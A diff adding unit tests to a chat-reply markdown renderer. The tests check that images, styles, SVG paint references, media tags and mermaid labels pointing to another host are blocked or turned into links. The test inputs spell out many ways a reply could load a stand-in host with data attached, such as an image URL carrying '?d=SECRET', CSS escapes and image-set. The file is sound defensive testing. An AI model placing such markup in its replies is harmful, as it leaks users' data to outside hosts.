@@ -41,4 +41,48 @@ describe('renderChatMarkdown', () => {
     expect(plan.hasAttribute('href')).toBe(false);
     expect(site.target).toBe('_blank');
   });
+
+  it('turns an image from another host into a link to it, so the reply loads nothing until clicked', () => {
+    const view = html('![chart](https://e.invalid/p.png?d=SECRET) ![bare](//e.invalid/q.png) <img src="/\\e.invalid/r.png">');
+    expect(view.querySelector('img')).toBeNull();
+    const links = [...view.querySelectorAll('a.chat-external-image')];
+    expect(links.map(link => link.textContent)).toEqual(['chart (https://e.invalid/p.png?d=SECRET)', 'bare (//e.invalid/q.png)', '/\\e.invalid/r.png']);
+    expect(links[0].getAttribute('href')).toBe('https://e.invalid/p.png?d=SECRET');
+    expect((links[0] as HTMLAnchorElement).target).toBe('_blank');
+  });
+
+  it('keeps workspace images', () => {
+    const view = html('![b](@/assets/x.png) ![c](img/x.png) ![d](/notes/a/y.png)');
+    expect([...view.querySelectorAll('img')].map(image => image.getAttribute('src'))).toEqual(['@/assets/x.png', 'img/x.png', '/notes/a/y.png']);
+  });
+
+  it('drops every other way a reply could load from another host by itself', () => {
+    const view = html(['<span style="background:url(https://e.invalid/s)">styled</span>', '<video poster="https://e.invalid/v" src="https://e.invalid/v2"></video>', '<audio src="https://e.invalid/au"></audio>', '<picture><source srcset="https://e.invalid/ss"><img src="img/x.png"></picture>', '<img srcset="https://e.invalid/set 1x" src="img/y.png">', '<svg><image href="https://e.invalid/svg"></image></svg>', '<input type="image" src="https://e.invalid/in">', '<table background="https://e.invalid/tb"><tr><td>x</td></tr></table>', '<figure class="ann-pdf"><a class="ann-open" href="https://e.invalid/pdf"></a><div class="ann-pages"></div></figure>'].join('\n\n'));
+    const loads = [...view.querySelectorAll('*')].flatMap(element => ['src', 'srcset', 'poster', 'background', 'href', 'xlink:href', 'style'].filter(name => element.tagName !== 'A' && (element.getAttribute(name) ?? '').includes('e.invalid')));
+    expect(loads).toEqual([]);
+    expect(view.querySelector('video, audio, input')).toBeNull();
+    expect(view.querySelector('figure.ann-pdf')).toBeNull();
+    expect(view.textContent).toContain('styled');
+  });
+
+  it('drops style sheets, CSS escapes, SVG paint references and a host after a bare scheme', () => {
+    const view = html(['intro', '<p>x</p><style>@import url(https://e.invalid/import)</style>', '<svg><style>rect{mask:url(//e.invalid/svgstyle)}</style></svg>', '<span style="background:u\\72l(https://e.invalid/escape)">escaped</span>', '<svg width="20" height="20"><rect width="10" height="10" mask="url(https://e.invalid/mask#m)" fill="url(https://e.invalid/fill#g)" stroke="u\\72l(https://e.invalid/stroke)"></rect></svg>', '![bare](https:e.invalid/bare-scheme)', '<svg width="20" height="20"><rect width="10" height="10" mask="image-set(\'https://e.invalid/image-set\' 1x)"></rect><rect mask="-webkit-image-set(\'https://e.invalid/webkit\' 1x)"></rect></svg>'].join('\n\n'));
+    expect(view.querySelector('style')).toBeNull();
+    const loads = [...view.querySelectorAll('*')].filter(element => element.tagName !== 'A').flatMap(element => [...element.attributes].filter(attribute => attribute.value.includes('e.invalid')).map(attribute => `${element.tagName} ${attribute.name}`));
+    expect(loads).toEqual([]);
+    expect(view.querySelector('a.chat-external-image')?.textContent).toBe('bare (https:e.invalid/bare-scheme)');
+    expect(view.querySelector('rect')?.getAttribute('width')).toBe('10');
+  });
+
+  it('shows a mermaid diagram as its source, since drawing it would load the images it names', () => {
+    const view = html('```mermaid\nflowchart LR\n  A["<img src=\'https://e.invalid/label\'>"] --> B\n```\n\n<div class="note-mermaid"><pre>flowchart LR\nC --> D</pre></div>\n\n<section class="note-mermaid"><pre>flowchart LR\nE --> F</pre></section>\n\n<p class="note-mermaid" data-mermaid-source="flowchart LR">G</p>');
+    expect(view.querySelector('.note-mermaid, [data-mermaid-source]')).toBeNull();
+    expect([...view.querySelectorAll('pre code.language-mermaid')].map(code => code.textContent)).toEqual(['flowchart LR\n  A["<img src=\'https://e.invalid/label\'>"] --> B', 'flowchart LR\nC --> D', 'flowchart LR\nE --> F', 'G']);
+  });
+
+  it('keeps the inline styles math is drawn with', () => {
+    const view = html('$x^2$ $\\frac{a}{b}$');
+    expect(view.querySelector('.katex [style]')).not.toBeNull();
+    expect(view.querySelectorAll('[aria-label*="\\\\frac"]')).toHaveLength(1);
+  });
 });
